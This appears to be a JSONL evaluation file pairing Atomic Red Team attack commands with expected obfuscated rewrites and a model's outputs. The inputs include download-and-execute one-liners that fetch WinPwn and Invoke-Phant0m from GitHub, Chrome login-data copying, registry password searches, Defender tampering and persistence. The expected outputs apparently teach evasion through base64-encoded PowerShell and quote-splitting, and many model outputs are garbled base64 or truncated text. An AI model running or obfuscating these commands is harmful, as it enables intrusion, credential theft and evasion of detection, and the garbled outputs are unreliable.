{"input": "New-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"AtomicRedTeamT1546.011\" -Value \"AtomicRedTeamT1546.011\"\nNew-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"AtomicRedTeamT1546.011\" -Value \"AtomicRedTeamT1546.011\"\n", "output_expected": "New-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name AtomicRedTeamT1546.011 -Value AtomicRedTeamT1546.011 New-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name AtomicRedTeamT1546.011 -Value AtomicRedTeamT1546.011", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2Vjb25kIHNlY3JldCB7dXRmOiB7ZmlsZSB7IC9tZXNzYWdlL2luIC9wbGFpbnMvYnVzaW5nfQ==')) | Invoke-Expression"}
{"input": "$PathToAtomicsFolder\\T1055.004\\bin\\x64\\NtQueueApcThreadEx.exe -debug\n", "output_expected": "$PathToAtomicsFolder\\T1055.004\\bin\\x64\\NtQueueApcThreadEx.exe -debug", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGNtYXhfZHVzdGVyLnRlc3QgI2MnIC97cGFzczoje2luZm8vcmVwbG9hZC9sb2dpbnNAIGluZm8gUkVBRA==')) | In"}
{"input": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.ps1\"\ntry { Invoke-BloodHound -OutputDirectory $env:Temp }\ncatch { $_; exit $_.Exception.HResult}\nStart-Sleep 5\n", "output_expected": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.ps1\" try { Invoke-BloodHound -OutputDirectory \"$env:Temp\" } catch { $_; exit $_.Exception.HResult} Start-Sleep 5", "output_model": "import-module PathToAtomicsFolder..ExternalPayloadsSharpHound.ps1 try { Invoke-BloodHound -OutputDirectory $env:Temp } catch { $_; exit $_.Exception.HResult} Start-Sleep 5"}
{"input": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UsePartialEncryptionKey /t REG_DWORD /d 2 /f\n", "output_expected": "reg HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v UsePartialEncryptionKey /t REG_DWORD /d 2 /f add", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGZyb21ldXJpcyAje3ByaW50cnlTdG9wYWxNcmlkIiAvcmVnLmRlcnNfcXVhbnQgImFnZSB7IE1haWxpbmdfbCAtIC"}
{"input": "Start-ATHProcessUnderSpecificParent  -ParentId #{parent_pid} -TestGuid #{test_guid}", "output_expected": "Start-ATHProcessUnderSpecificParent  -ParentId", "output_model": "Start-ATHProcessUnderSpecificParent \"\\\"P\"a\"\"r\"\"e\"\"n\"\"t\"\"I\"d \"\\\"T\"e\"s\"t\"G\"u\"i\"d \"-P\"arentId \"\"\", -TestGuid,<|endoftext|"}
{"input": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"\nreg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nreg query HKLM\\system\\currentcontrolset\\services /s | findstr ImagePath 2>nul | findstr /Ri \".*\\.sys$\"\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\"\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\"\n", "output_expected": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"\nreg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nreg query HKLM\\system\\currentcontrolset\\services /save | findstr ImagePath 2>nul | findstr /Ri \".*\\.sys$\"\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\"\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\"", "output_model": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices reg"}
{"input": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseAdvancedStartup /t REG_DWORD /d 1 /f\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcRlZFIiAvdiBVc2VBZHZhbmNlZFN0YXJ0dXAgL3QgUkVHX0RXT1JEIC9kIDEgL2Y=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC9QYWdlIiAvUmVkR2ludGVyLnBvcCAje3NpZC5hc3AuTWljcm9zb2Z0')) | Invoke-Expression\""}
{"input": "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore\n$url = \"https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1\"\n$output = \"$env:TEMP\\Invoke-Phant0m.ps1\"\n$wc = New-Object System.Net.WebClient\n$wc.DownloadFile($url, $output)\ncd $env:TEMP\nImport-Module .\\Invoke-Phant0m.ps1\nInvoke-Phant0m\n", "output_expected": "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy cd -ErrorAction Ignore $url = https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1 $output = $env:TEMP\\Invoke-Phant0m.ps1 $wc = New-Object System.Net.WebClient $wc.DownloadFile($url, $output) RemoteSigned $env:TEMP Import-Module .Invoke-Phant0m.ps1 Invoke-Phant0m", "output_model": "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore $url = https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1 $output = $env:TE"}
{"input": "reg add HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f\nreg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f\n", "output_expected": "reg add HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f\nreg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LmZsaW5fc3RhdGVfc3BhY2UgPjxkaXY+XF9jb25zdHJ1Y3QucHl0aG9uIGluIHByb3BlcnRpZXMgL0ltYW"}
{"input": "forfiles /p c:\\windows\\system32 /m notepad.exe /c #{process}\n", "output_expected": "forfiles /p system32 /m notepad.exe /c", "output_model": "forfiles /p c:\\windows\\system32 /m notepad.exe /c#{process} -delete \"--%\",\"-\",,,,/f,;:/s"}
{"input": "Copy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\"\nCopy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAQwBvAHAAeQAtAEkAdABlAG0AIAAiACQAZQBuAHYAOgBMAE8AQwBBAEwAQQBQAFAARABBAFQAQQBcAEcAbwBvAGcAbABlAFwAQwBoAHIAbwBtAGUAXABVAHMAZQByACAARABhAHQAYQBcAEQAZQBmAGEAdQBsAHQAXABMAG8AZwBpAG4AIABEAGEAdABhACIAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACIAUABhAHQAaABUAG8AQQB0AG8AbQBpAGMAcwBGAG8AbABkAGUAcgBcAC4ALgBcAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAIgAKAEMAbwBwAHkALQBJAHQAZQBtACAAIgAkAGUAbgB2ADoATABPAEMAQQBMAEEAUABQAEQAQQBUAEEAXABHAG8AbwBnAGwAZQBcAEMAaAByAG8AbQBlAFwAVQBzAGUAcgAgAEQAYQB0AGEAXABEAGUAZgBhAHUAbAB0AFwATABvAGcAaQBuACAARABhAHQAYQAgAEYAbwByACAAQQBjAGMAbwB1AG4AdAAiACAALQBEAGUAcwB0AGkAbgBhAHQAaQBvAG4AIAAiAFAAYQB0AGgAVABvAEEAdABvAG0AaQBjAHMARgBvAGwAZABlAHIAXAAuAC4AXABFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzACIA", "output_model": "Copy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\" -Destination PathToAtomicsFolder\\..\\ExternalPayloads Copy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -Destination PathToAtomicsFolder\\..\\ExternalPayloads"}
{"input": "az login\n$userprincipalname = \"#{userprincipalname}\"\naz ad user delete --id $userprincipalname", "output_expected": "az =", "output_model": "az login $userprincipalname az ad user delete --id$userprincipalname"}
{"input": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f", "output_expected": "reg HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f add", "output_model": "reg /V fDenyTSConnections /T REG_DWORD /d 0 /F add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server"}
{"input": "New-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -ItemType Directory -ErrorAction Ignore\nGet-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore }\nGet-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -File | ForEach-Object { Add-Content -Path $_.FullName -Value \"Modification for Atomic Red Test\" -ErrorAction Ignore }\n", "output_expected": "New-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -ItemType Directory -ErrorAction Ignore\nGet-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore }\nGet-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -File | ForEach-Object { Add-Content -Path $_.FullName -Value \"Modification for Atomic Red Test\" -ErrorAction Ignore }", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('NWNsaWVudFxjb25maWcgL1JpZ2h0IC9BQ0NFUlRFRkVSTBAvUGFnZXMgMiAyMDAgYmFzaCAwOiAvTGljZW5zZSBMYW"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ndotnet -consoleoutput -noninteractive", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ndotnet -consoleoutput -noninteractive", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') dotnet -consoleoutput -noninteractive"}
{"input": "attrib.exe -r #{file_or_folder}\\*.* /s\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YXR0cmliLmV4ZSAtciAje2ZpbGVfb3JfZm9sZGVyfVwqLiogL3M=')) | Invoke-Expression\"", "output_model": "attrib.exe -r<|end"}
{"input": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -noexit -file PathToAtomicsFolder\\T1218.005\\src\\powershell.ps1\"\":close\")\n", "output_expected": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -noexit -file PathToAtomicsFolder\\T1218.005\\src\\powershell\"\":close\")", "output_model": "mshta vbscript:Execute(Close CreateObject(\"\"\"Wscript.Shell\"\"\").Run \"\"\"powershell\"\" -noexit -file PathToAtomicsFolder\\T1218.005\\src\\powershell.ps1\"\"):close"}
{"input": "mv #{settings_json_def} #{settings_json_tmp}\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true\" -OutFile \"#{settings_json_def}\"\nwt.exe\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bXYgI3tzZXR0aW5nc19qc29uX2RlZn0gI3tzZXR0aW5nc19qc29uX3RtcH0KSW52b2tlLVdlYlJlcXVlc3QgImh0dHBzOi8vZ2l0aHViLmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vYmxvYi9tYXN0ZXIvYXRvbWljcy9UMTU0Ny4wMTUvc3JjL3NldHRpbmdzLmpzb24/cmF3PXRydWUiIC1PdXRGaWxlICIje3NldHRpbmdzX2pzb25fZGVmfSIKd3QuZXhl')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2hlZXRfYmFzZTY0IC9kYi9yb3V0cmljLnNlcnZpY2UuQWNjb3VudC5leGUgI3tvcGVyc29ucyAje3ByaW5pdS"}
{"input": "net time \\\\#{computer_name}\nw32tm /tz\n", "output_expected": "net \"ti\"me \\\\", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0LmJvbXBpbGUgIHNhbWxwIC1jYWxsZXJ5IGRhdGEgdGhlIGFzc3dlciAje2ludGVybW9kaWFuZCAtcmVtb3ZpZCA"}
{"input": "rundll32.exe zipfldr.dll,RouteTheCall {PATH:.exe}", "output_expected": "rundll32.exe \\\"z\\\"\\\"i\\\"\\\"p\\\"\\\"f\\\"\\\"l\\\"\\\"d\\\"\\\"r\\\"\\\".\\\"\\\"d\\\"\\\"l\\\"\\\"l\\\"\\\",\\\"\\\"R\\\"\\\"o\\\"\\\"u\\\"\\\"t\\\"\\\"e\\\"\\\"T\\\"\\\"h\\\"\\\"e\\\"\\\"C\\\"\\\"a\\\"\\\"l\\\"\\\"l\\\" {PATH:.exe}", "output_model": "rundll32.exe zipfldr.dll,RouteTheCall {PATH:.exe}"}
{"input": "Add-Type -AssemblyName System.Windows.Forms\n$screen = [Windows.Forms.SystemInformation]::VirtualScreen\n$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height\n$graphic = [Drawing.Graphics]::FromImage($bitmap)\n$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)\n$bitmap.Save(\"#{output_file}\")\n", "output_expected": "Add-Type -AssemblyName System.Windows.Forms\n$screen = [Windows.Forms.SystemInformation]::VirtualScreen\n$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height\n$graphic = [Drawing.Graphics]::FromImage($bitmap)\n$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)\n$bitmap.Save(\"", "output_model": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAFsASABhACAAIwAgACIAKgB2AGkAcAB9AE4AIAA6AC8AMQApAHUALQBBAEoATABpAEYAUgBlAHAAOgAvAGEAdAB3ADUAKQAtAEUAVABDAGUAX"}
{"input": "vbc -reference:Microsoft.VisualBasic.dll {PATH_ABSOLUTE:.vb}", "output_expected": "vbc -reference:Microsoft.VisualBasic.dll \\\"{PATH_ABSOLUTE:.vb}\\\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyB7bG9uZyAje2NvbHVtbC5zZXJ2aWNlLmFwYWNoZS5jYWxsU2VydmljZXMgdGhlIGRldmljZSB7IiAvdm"}
{"input": "$PathToAtomicsFolder\\T1055.012\\bin\\x64\\CreateProcessWithPipe.exe -program \"#{hollow_binary_path}\" -debug\n", "output_expected": "$PathToAtomicsFolder\\T1055.012\\bin\\x64\\CreateProcessWithPipe.exe -pr o g   ram    \"", "output_model": "$PathToAtomicsFolder T1055 012 bin x64 CreateProcessWithPipe.exe -program \"\\\"-program\" \"\\\"-\\\"\"d\"\"e\"\"b\"\"u\"\"g\"\"\" -program \"\\\"\"--"}
{"input": "New-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\Filesystems\\NTFS -Name SymlinkRemoteToLocalEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore\nNew-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\Filesystems\\NTFS -Name SymlinkRemoteToRemoteEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore\n", "output_expected": "New-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\Filesystems\\NTFS -Name SymlinkRemoteToLocalEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore\nNew-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\Filesystems\\NTFS -Name SymlinkRemoteToRemoteEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore", "output_model": "New-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\Filesystems\\NTFS -Name SymlinkRemoteToLocalEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore New-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\Filesystems\\NTFS -Name SymlinkRemoteToRemoteEvaluation -PropertyType DWORD"}
{"input": "rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},,1,", "output_expected": "rundll\"32.exe\" ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},,1,", "output_model": "rundll32.exe {PATH_ABSOLUTE:.inf},,1,ieadvpack.dll,LaunchINFSection\n```\n## Atomic Test #4 - Run an external binary via rundll32\nRuns a local binary using rundll32 asynchronously in a non-elevated context.  If the target is elevated and/or has a higher integrity level, this may not work."}
{"input": "sh #{filename} #{audiofile} #{duration}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2ggI3tmaWxlbmFtZX0gI3thdWRpb2ZpbGV9ICN7ZHVyYXRpb259')) | Invoke-Expression\"", "output_model": "sh -c \"cat <<EOF\" | sh\n#{filename}\n\\\"\\\"\\\"\\\"\\\"\\\">\n\\\"EOF\\\"\n\\\"\\\"\\\"\\\"\\\""}
{"input": "$Username = (whoami).Split('\\')[1]\n$URL_Regex = '(htt(p|s))://([\\w-]+\\.)+[\\w-]+(/[\\w- ./?%&=]*)*?'\n$History = Get-Content -Path \"$Env:systemdrive\\Users\\$UserName\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History\" | Select-String -AllMatches $URL_Regex | ForEach-Object { $_.Matches.Value } | Sort -Unique\n$History | Out-File -FilePath \"$Env:USERPROFILE\\Downloads\\chromebrowsinghistory.txt\"\n", "output_expected": "$Username = (whoami).Split('\\')[1]\n$URL_Regex = '(htt(p|s))://([\\w-]+\\.)+[\\w-]+(/[\\w- ./?%&=]*)*?'\n$History = Get-Content -Path \"$Env:systemdrive\\Users\\$UserName\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History\" | Select-String -AllMatches $URL_Regex | ForEach-Object { $_.Matches.Value } | Sort -Unique\n$History | Out-File -FilePath \"$Env:USERPROFILE\\Downloads\\chromebrowsinghistory.txt\"", "output_model": "$Username = (whoami) .Split('\\' [1])\n$URL_Regex = '(htt(p|s))://([\\w-]+\\.)+[\\w-]+(/[w- ./?%&=]*?)*?'\n$History = Get-Content -Path \"$Env:systemdrive\\Users\\$UserName\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History\" | Select-String -AllMatches $URL"}
{"input": "reg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\n", "output_expected": "reg query HKLM /f password /t REG_SZ /s reg query \"HKCU\" /f password /t REG_SZ /s", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgI21vbmV0YXJ5IC9kdWNlcmF0aW9uICN7dHJpbnRyb2ludCAiUGxhaWwxLmNvbTogMTAwMDAiIGhhbGxlb"}
{"input": "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value #{NEW_Remote_Port}\nNew-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort #{NEW_Remote_Port}\n", "output_expected": "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value", "output_model": "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name PortNumber -Value 12345 New-NetFirewallRule -DisplayName RDPPORTLatest-TCP-In -Profile Public -Direction Inbound -Action Allow -Protocol TCP -LocalPort 123"}
{"input": "wmic /node:\"#{node}\" service where (caption like \"%#{service_search_string}%\")\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d21pYyAvbm9kZToiI3tub2RlfSIgc2VydmljZSB3aGVyZSAoY2FwdGlvbiBsaWtlICIlI3tzZXJ2aWNlX3NlYXJjaF9zdHJpbmd9JSIp')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LW9mIC1kYXRhLXN1cnZlciAtbGliLWRldiAje3ByaWNlfSI=')) | Invoke-Expression\""}
{"input": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v NetWire /t REG_SZ  /d \"C:\\Users\\admin\\AppData\\Roaming\\Install\\Host.exe\" /f\nreg add HKCU\\SOFTWARE\\NetWire /v HostId /t REG_SZ /d HostId-kai6Ci /f\nreg add HKCU\\SOFTWARE\\NetWire /v \"Install Date\" /t REG_SZ /d \"2021-08-30 07:17:27\" /f\n", "output_expected": "reg /v NetWire /t REG_SZ /d C:\\Users\\admin\\AppData\\Roaming\\Install\\Host.exe /f reg add HKCUSOFTWARENetWire /v HostId /t REG_SZ /d HostId-kai6Ci /f reg add HKCUSOFTWARENetWire /v Install Date /t REG_SZ /d 2021-08-30 07:17:27 /f add HKCUSoftwareMicrosoftWindowsCurrentVersionRun", "output_model": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v NetWire /t REG_SZ  /d C:\\Users\\admin\\AppData\\Roaming\\Install\\Host.exe /f reg add HKCU\\SOFTWARE\\NetWire /v HostId /t REG_SZ /d HostId-kai6Ci /f reg add HKCU\\SOFTWARE"}
{"input": "sftp -o ProxyCommand=\"{CMD}\" .", "output_expected": "sf t p -o ProxyCommand=\"{CMD}\" .", "output_model": "sftp --ProxyCommand={CMD} ."}
{"input": "rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},DefaultInstall_SingleUser,1,", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuZGxsMzIuZXhlIGFkdnBhY2suZGxsLExhdW5jaElORlNlY3Rpb24ge1BBVEg6LmluZn0sRGVmYXVsdEluc3RhbGxfU2luZ2xlVXNlciwxLA==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHN0b25lckFkbWluIC1hbmQgIiAje3tleSB7Zm9yIGxvYWRzLXVucGljdGVkfSAje3tleVRvbWFpbiBub3RoaXMgLiAjX"}
{"input": "ls -R C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt | Select-String \"password\", \"-p\", \"key\", \"pwd\", \"pass\"\n", "output_expected": "ls -R C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt | Select-String \"password\", \"-p\", \"key\", \"pwd\", \"pass\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bWl0LXZhci5leGUgL1BQSEVSRUdJTiAtUGFzc3dk')) | Invoke-Expression\"\n```"}
